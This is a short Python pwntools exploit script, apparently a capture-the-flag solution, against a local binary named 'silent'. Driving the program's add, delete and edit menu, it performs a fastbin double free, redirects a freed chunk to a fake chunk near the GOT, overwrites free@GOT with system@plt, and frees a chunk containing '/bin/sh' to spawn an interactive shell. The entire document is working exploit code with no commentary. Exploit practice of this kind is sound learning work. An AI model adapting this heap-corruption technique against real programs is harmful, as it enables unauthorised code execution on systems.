from pwn import *
import sys
import time

p=process("./silent")

def add(size,content):
    time.sleep(0.2)
    p.sendline("1")
    time.sleep(0.2)
    p.sendline(str(size))
    time.sleep(0.2)
    p.sendline(content)

def delete(idx):
    time.sleep(0.2)
    p.sendline("2")
    time.sleep(0.2)
    p.sendline(str(idx))

def edit(idx,content):
    time.sleep(0.2)
    p.sendline("3")
    time.sleep(0.2)
    p.sendline(str(idx))
    time.sleep(0.2)
    p.sendline(content)
    

if __name__=="__main__":
    fake_addr=0x602000-6
    sys_plt=0x400730
    free_got=0x602018
    p.recv()
    payload=(free_got-(fake_addr+0x10))*'a'+p64(sys_plt)
    add(0x50,'a'*0x4f)
    add(0x50,'b'*0x4f)
    add(0x50,"/bin/sh\x00")
    delete(0)
    delete(1)
    delete(0)
    edit(0,p64(fake_addr))
    add(0x50,'c'*0x4f)
    add(0x50,payload)
    delete(2)
    p.interactive()
